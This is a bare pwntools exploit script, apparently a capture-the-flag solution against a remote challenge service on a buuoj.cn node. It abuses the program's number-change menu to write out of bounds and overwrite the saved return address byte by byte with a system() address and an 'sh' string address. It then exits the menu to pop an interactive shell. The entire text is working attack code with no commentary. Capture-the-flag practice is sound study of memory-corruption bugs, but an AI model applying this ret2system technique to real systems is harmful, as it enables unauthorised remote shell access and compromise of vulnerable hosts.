from pwn import*
p=remote('node4.buuoj.cn',26739)
p.sendlineafter("How many numbers you have:\n","1")
p.sendlineafter("Give me your numbers\n","1")
p.recvuntil("5. exit\n")
 
offset=0x84 
sys = 0x08048450
 
def write_addr(addr,num):
	p.sendline("3")
	p.sendlineafter("which number to change:\n",str(addr))
	p.sendlineafter("new number:\n",str(num))
	p.recvuntil("5. exit\n")

write_addr(offset,0X50)
write_addr(offset+1,0X84)
write_addr(offset+2,0X04)
write_addr(offset+3,0X08)
sh_addr =   0x08048987
offset+=8
write_addr(offset,0x87)
write_addr(offset+1,0X89)
write_addr(offset+2,0X04)
write_addr(offset+3,0X08)
 
p.sendline("5")
p.interactive()
